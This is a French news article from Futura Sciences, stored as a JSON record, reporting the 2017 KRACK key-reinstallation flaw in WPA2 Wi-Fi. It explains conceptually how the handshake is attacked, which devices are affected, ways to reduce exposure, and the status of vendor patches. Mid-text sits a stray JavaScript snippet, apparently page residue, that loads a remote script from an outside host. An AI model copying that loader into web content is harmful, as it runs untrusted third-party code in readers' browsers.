{"title": "Wi-Fi : la faille de sécurité Krack peut rendre toutes les connexions WPA2 piratables", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "17/10/2017", "content": "Un chercheur en sécurité de l'université catholique de Louvain (Belgique) a dévoilé l'existence d'une faille de sécurité critique dans le protocole WPA2, le mécanisme qui sécurise les connexions sans fil Wi-Fi. Une attaque exploitant cette vulnérabilité pourrait permettre d'espionner n'importe quelle communication d'un appareil connecté à un point d'accès. Les terminaux Windows, macOS, Linux, Android et iOS sont potentiellement tous concernés. Ce qu'il faut retenir Le protocole WPA2 sécurise les connexions Wi-Fi à l’aide d’un chiffrement AES. Une vulnérabilité présente au niveau de la procédure d’authentification du WPA2 pourrait permettre à un assaillant se trouvant à portée d’un réseau Wi-Fi de déchiffrer le flux de données. Les acteurs concernés, dont Apple, Google et Microsoft, ont commencé à diffuser des correctifs de sécurité ou vont le faire. La semaine a débuté avec une nouvelle peu rassurante quant à la sécurité des connexions  Wi-Fi  que nous utilisons sur nos  ordinateurs ,  smartphones ,  tablettes  et autres objets connectés. Mathy Vanhoef, un chercheur de l'université catholique de Louvain (Belgique) a rendu publique sa découverte d'une vulnérabilité critique présente dans le  protocole   WPA2  qui est à ce jour le système de sécurité le plus élevé pour protéger les réseaux Wi-Fi. Une preuve de concept de cette  faille  baptisée  Krack  ( Key Reinstallation Attacks  , en français « attaque par réinstallation de clé ») démontre qu'un assaillant se trouvant à portée d'un terminal ou d'un point d'accès Wi-Fi peut intercepter les données chiffrées qui transitent et dans certains cas même, injecter un  logiciel malveillant . Les ordinateurs, smartphones et téléphones mobiles sous Windows, macOS,  Linux ,  Android  et  iOS  sont concernés. Entre de mauvaises mains, cette technique pourrait servir à dérober des données sensibles telles que des  mots de passe , coordonnées bancaires, courriels, discussions sur des messageries, photos, vidéos, etc.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Tout commence par une poignée de mains Le talon d'Achille du WAP2 exploité par Krack s'attaque à l'étape initiale de négociation (4  way handshake  en anglais) qui intervient au moment où un terminal se connecte au point d'accès Wi-Fi. Les deux équipements échangent une série de quatre messages qui leur permettent de s'authentifier et définissent des clés pour chiffrer le flux de données qui va circuler entre eux.  Or, en créant un second point d'accès  Wi-Fi  cloné du premier auquel le terminal va se connecter, il est possible de s'immiscer dans les messages échangés entre les deux équipements et d'émettre une information qui va provoquer une réinitialisation des données cryptographiques. Cela permet de réutiliser les clés de  chiffrement  qui sont émises à partir de la clé principale de la session Wi-Fi. L'assaillant n'a plus alors qu'à repérer dans le flux chiffré des paquets de données qu'il connaît pour pouvoir déduire la suite de clés et déchiffrer tous les contenus. Changer le mot de passe de son réseau Wi-Fi ne sert donc à rien pour se protéger...  Cette vidéo publiée par le chercheur de l’université catholique de Louvain Mathy Vanhoef présente une démonstration de l’attaque Krack contre des terminaux Android et Linux. © Mathy Vanhoef Les terminaux Android et Linux sont les plus vulnérables Étant donné que la source du problème se situe au niveau du protocole WPA2, potentiellement tous les équipements réseau et terminaux utilisant une connexion Wi-Fi de ce type sont concernés. Mais Mathy Vanhoef souligne que les appareils sous Android 6.0 (et suivants) et Linux sont les plus vulnérables. Toutefois, le chercheur indique qu'à ce jour, il n'a pas connaissance d'une exploitation active de cette vulnérabilité pour mener des attaques.  Mais que peut faire un usager pour se protéger ? Il est important de rappeler qu'une telle attaque, si elle existe, ne peut fonctionner qu'en étant physiquement à portée d'un réseau Wi-Fi. L'autre point positif est que la faille WPA2 peut être colmatée par les acteurs concernés. D'ici là, quelques mesures concrètes peuvent limiter les risques d'exposition. Tout d'abord, privilégier la navigation sur des sites web sécurisés en  HTTPS  qui offre une protection supplémentaire. Cependant, Mathy Vanhoef avertit que ce n'est pas la panacée dans la mesure où certains sites web mal configurés peuvent être forcés à désactiver le protocole HTTPS.  Comment se protéger contre Krack S l'on se trouve dans un lieu public, une autre parade consiste à systématiquement désactiver la connexion Wi-Fi et à privilégier une connexion sur un réseau cellulaire. Mais cela nécessite alors un suivi de sa consommation de données pour éviter les surcoûts. Il y a également l'option du  VPN , le réseau privé virtuel, qui va créer un tunnel de connexion chiffré en reroutant le trafic  Internet  sur un  serveur  sécurisé. Mais tous les services de VPN ne se valent pas, notamment en ce qui concerne le respect de la  confidentialité  et l'exploitation des données. La véritable solution à ce problème se trouve au niveau des éditeurs de  systèmes d'exploitation , fabricants de  routeurs Wi-Fi , fournisseurs d'accès Internet et autres acteurs concernés qui doivent diffuser au plus vite des correctifs de sécurité. Mathy Vanhoef indique les avoir avertis à la mi-juillet. Microsoft a d'ores et déjà émis un correctif de sécurité diffusé par mise à jour automatique de Windows. Apple a fait de même pour les  versions beta  d'iOS, macOS, tvOS et watchOS et prévoit de pousser très rapidement les mises à jour vers les utilisateurs.  Google  a fait savoir qu'il travaillait à un correctif qui serait disponible début novembre. Encore faudra-t-il qu'il soit rapidement relayé par les fabricants de smartphones et tablettes Android. En ce qui concerne Linux, une rustine est disponible pour les distributions Debian, Ubuntu (14.04 et suivants) et Gentoo tandis qu'OpenBSD a été mis à jour dès juillet. Le site  ZDNet.com  tient à jour une liste des fabricants, éditeurs et équipementiers qui ont commencé diffuser des mises à jour ou prévoient de le faire.  ", "theme": "tech"}